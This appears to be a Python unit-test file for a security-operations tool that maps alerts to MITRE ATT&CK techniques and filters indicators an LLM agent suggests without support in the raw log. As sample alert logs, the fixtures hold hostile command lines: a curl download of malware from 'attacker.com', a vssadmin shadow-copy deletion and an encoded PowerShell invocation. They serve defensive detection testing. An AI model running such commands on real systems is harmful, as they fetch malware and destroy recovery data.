"""Unit tests for the MITRE ATT&CK Mapper."""

from datetime import datetime
from soc_analyst.mitre.attack_mapper import MitreAttackMapper
from soc_analyst.models.schemas import SecurityAlert


def test_map_alert_brute_force():
    mapper = MitreAttackMapper()
    alert = SecurityAlert(
        id="test-brute",
        timestamp=datetime.utcnow(),
        rule_description="SSH brute force attempt",
        full_log="Failed password for admin from 192.168.1.1"
    )
    mappings = mapper.map_alert(alert)
    assert len(mappings) > 0
    assert any(m.technique_id == "T1110" and m.technique_name == "Brute Force" and m.tactic == "Credential Access" for m in mappings)


def test_map_alert_powershell():
    mapper = MitreAttackMapper()
    alert = SecurityAlert(
        id="test-ps",
        timestamp=datetime.utcnow(),
        rule_description="Suspicious PowerShell activity",
        full_log="powershell.exe -EncodedCommand SQBFAFgA"
    )
    mappings = mapper.map_alert(alert)
    assert len(mappings) > 0
    assert any(m.technique_id == "T1059.001" and m.technique_name == "PowerShell / Command and Scripting Interpreter" and m.tactic == "Execution" for m in mappings)


def test_map_alert_ransomware():
    mapper = MitreAttackMapper()
    alert = SecurityAlert(
        id="test-ransom",
        timestamp=datetime.utcnow(),
        rule_description="Shadow copy deletion detected",
        full_log="vssadmin.exe Delete Shadows /All /Quiet"
    )
    mappings = mapper.map_alert(alert)
    assert len(mappings) > 0
    assert any(m.technique_id == "T1490" and m.technique_name == "Inhibit System Recovery" and m.tactic == "Impact" for m in mappings)


def test_map_alert_encryption():
    mapper = MitreAttackMapper()
    alert = SecurityAlert(
        id="test-encrypt",
        timestamp=datetime.utcnow(),
        rule_description="Ransomware activity detected",
        full_log="Files encrypted with extension .locked"
    )
    mappings = mapper.map_alert(alert)
    assert len(mappings) > 0
    assert any(m.technique_id == "T1486" for m in mappings)
    assert any(m.tactic == "Impact" for m in mappings)


def test_llm_suggestions_not_trusted():
    from unittest.mock import patch
    from soc_analyst.agents.soc_analyst import SOCAnalystAgent
    
    agent = SOCAnalystAgent()
    alert = SecurityAlert(
        id="test-llm-untrusted",
        timestamp=datetime.utcnow(),
        rule_description="Some benign event",
        full_log="User logged in normally"
    )
    
    with patch.object(agent, "_run_analysis_chain") as mock_chain:
        mock_chain.return_value = {
            "summary": "User logged in normally",
            "threat_explanation": "benign",
            "suggested_mitre_techniques": ["T1021"]
        }
        
        analysis = agent.analyze_alert(alert)
        assert not any(m.technique_id == "T1021" for m in analysis.mitre_mappings)


def test_agent_does_not_invent_iocs_and_assets():
    from unittest.mock import patch
    from soc_analyst.agents.soc_analyst import SOCAnalystAgent
    
    agent = SOCAnalystAgent()
    alert = SecurityAlert(
        id="test-invent-prevention",
        timestamp=datetime.utcnow(),
        rule_description="Successful SSH connection",
        full_log="Accepted publickey for admin from 192.168.1.50 port 22 ssh2",
        agent_name="production-server-01"
    )
    
    with patch.object(agent, "_run_analysis_chain") as mock_chain:
        mock_chain.return_value = {
            "summary": "SSH connection established.",
            "threat_explanation": "SSH connection allowed.",
            "attack_narrative": "None",
            "indicators": ["192.168.1.50", "99.99.99.99"],  # 99.99.99.99 is not in raw log
            "affected_assets": ["production-server-01", "unrelated-server-99"],  # unrelated-server-99 is not in raw log
            "suggested_mitre_techniques": ["T1021"]
        }
        
        analysis = agent.analyze_alert(alert)
        
        # 192.168.1.50 is valid (present in raw log)
        assert "192.168.1.50" in analysis.indicators
        # 99.99.99.99 is not in the alert context, so it must be filtered out
        assert "99.99.99.99" not in analysis.indicators
        
        # production-server-01 is valid (matches agent_name)
        assert "production-server-01" in analysis.affected_assets
        # unrelated-server-99 is not in the alert context, so it must be filtered out
        assert "unrelated-server-99" not in analysis.affected_assets


def test_map_alert_raw_wazuh_mitre():
    mapper = MitreAttackMapper()
    alert = SecurityAlert(
        id="test-raw-wazuh-mitre",
        timestamp=datetime.utcnow(),
        rule_description="File downloaded via ingress tool",
        full_log="curl http://attacker.com/malware -o /tmp/malware",
        raw={
            "rule": {
                "mitre": {
                    "id": ["T1105"],
                    "technique": ["Ingress Tool Transfer"],
                    "tactic": ["Command and Control"]
                }
            }
        }
    )
    mappings = mapper.map_alert(alert)
    assert len(mappings) > 0
    
    # Verify that T1105 with correct name and tactic appears in output
    matching = next((m for m in mappings if m.technique_id == "T1105"), None)
    assert matching is not None
    assert matching.technique_name == "Ingress Tool Transfer"
    assert matching.tactic == "Command and Control"


def test_mitre_mapping_case_a():
    """
    CASE A: Sysmon Event ID 11, image = powershell.exe,
    targetFilename = __PSScriptPolicyTest_xxx.ps1, commandLine absent.
    EXPECTED: No T1059.001 mapping.
    """
    mapper = MitreAttackMapper()
    raw = {
        "data": {
            "win": {
                "system": {"eventID": "11"},
                "eventdata": {
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "targetFilename": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_abc123.xyz.ps1"
                }
            }
        }
    }
    alert = SecurityAlert(
        id="test-case-a",
        timestamp=datetime.utcnow(),
        rule_description="Executable file dropped in folder commonly used by malware",
        full_log="__PSScriptPolicyTest_abc123.xyz.ps1 dropped",
        raw=raw
    )
    mappings = mapper.map_alert(alert)
    assert not any(m.technique_id == "T1059.001" for m in mappings)


def test_mitre_mapping_case_b():
    """
    CASE B: Sysmon Event ID 11, image = powershell.exe,
    targetFilename = test-suspicious.ps1, commandLine absent.
    EXPECTED: Do not infer T1059.001 merely from powershell.exe.
    """
    mapper = MitreAttackMapper()
    raw = {
        "data": {
            "win": {
                "system": {"eventID": "11"},
                "eventdata": {
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "targetFilename": "C:\\Users\\user\\AppData\\Local\\Temp\\test-suspicious.ps1"
                }
            }
        }
    }
    alert = SecurityAlert(
        id="test-case-b",
        timestamp=datetime.utcnow(),
        rule_description="Executable file dropped in folder commonly used by malware",
        full_log="test-suspicious.ps1 dropped",
        raw=raw
    )
    mappings = mapper.map_alert(alert)
    assert not any(m.technique_id == "T1059.001" for m in mappings)


def test_mitre_mapping_case_c():
    """
    CASE C: Sysmon Event ID 1, image = powershell.exe,
    commandLine contains an actual PowerShell execution indicator.
    EXPECTED: T1059.001.
    """
    mapper = MitreAttackMapper()
    raw = {
        "data": {
            "win": {
                "system": {"eventID": "1"},
                "eventdata": {
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "commandLine": "powershell.exe -EncodedCommand SQBFAFgA"
                }
            }
        }
    }
    alert = SecurityAlert(
        id="test-case-c",
        timestamp=datetime.utcnow(),
        rule_description="Suspicious PowerShell command",
        full_log="powershell.exe -EncodedCommand SQBFAFgA",
        raw=raw
    )
    mappings = mapper.map_alert(alert)
    assert any(m.technique_id == "T1059.001" for m in mappings)


def test_mitre_mapping_case_d():
    """
    CASE D: An invalid/hallucinated MITRE ID such as T9999.999.
    EXPECTED: Rejected and never returned.
    """
    mapper = MitreAttackMapper()
    mapping = mapper._lookup_technique("T9999.999")
    assert mapping is None


def test_mitre_mapping_case_e():
    """
    CASE E: A valid MITRE technique ID.
    EXPECTED: Correct official technique name/metadata returned.
    """
    mapper = MitreAttackMapper()
    mapping = mapper._lookup_technique("T1110")
    assert mapping is not None
    assert mapping.technique_name == "Brute Force"
    assert mapping.tactic == "Credential Access"


